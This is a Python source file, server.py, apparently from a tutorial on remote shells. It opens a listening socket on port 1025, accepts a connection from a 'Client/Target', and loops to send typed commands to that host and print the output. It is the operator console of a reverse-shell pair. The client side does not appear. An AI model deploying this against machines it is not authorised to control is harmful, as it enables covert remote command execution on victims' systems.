'''
This file server.py is to be executed in the server. It listens and accepts for connections. After etablishing connection it can 
send commands to the client and display out the output of that particular command.
'''
#Importing modules.
import socket
import sys

#Creating a socket
def create_socket():
    #sometimes due to some reason we may fail to create socket and this is handled by try except block.
    try:
        global host
        global port
        global s
        host = ''#It automatically gets the ip address of the system.
        port = 1025#we can use any port number greater than 1023.
        s = socket.socket()
    except socket.error as msg:
        print(f"Failed to create socket\n{msg}")

#binding a socket
def bind_socket():
    #Sometime system may fail to bind socket and it is handled by the use of try excpet block. 
    try:
        global host
        global port
        global s
        print(f"Binding socket using IP {host} on port {port}.\n")
        s.bind((host , port))
        s.listen(5)
        print(f"Listinig for connection on port {port}...\n")
    except socket.error as msg:
        print(f"Failed to bind socket {msg}.\n")

#accepting connections
def accept_socket():
    try:
        '''
        Whenever we accept any sorts of connection, connection object along with a list containing ip address of the target
        and its corresponding port is returned.
        '''
        conn , address = s.accept() 
        print(f"Established connection to {address[0]} on port {address[1]}.\n")
        send_commands(conn)#calling send_command function which is responsible for sending commands and printing out it's output
        
    finally:
        '''
        Although we tear out connection from the server side, it still have connection to client because of which we might run
        into error saying that the ip address in use. This final block closes the connection from the client side as well.
        '''
        conn.close()
        s.close()
        sys.exit()

#creating a function to send commands.
def send_commands(conn):
    #we make use of connection object i.e. 'conn' to send commands to the Client/Target.
    while True:
        #This while loop allows us to send commands indifinitely. 
        cmd = input()#accepts the command.
        if cmd == 'quit' or cmd == 'exit':
            conn.send(str.encode(cmd , 'utf-8'))#Converting string into bytes.
            conn.close()
            s.close()
            sys.exit()
        if len(cmd) > 0:
            conn.send(str.encode(cmd , 'utf-8'))
            response = str(conn.recv(2048) , 'utf-8')#receiving response from client in bytes and converting them into string.
            print(response + '$ ', end = '')

#Creating main method to call out all functions.            
def main():
    create_socket()
    bind_socket()
    accept_socket()

#Calling main method.    
main()

                                                   ''' END OF SERVER.PY '''
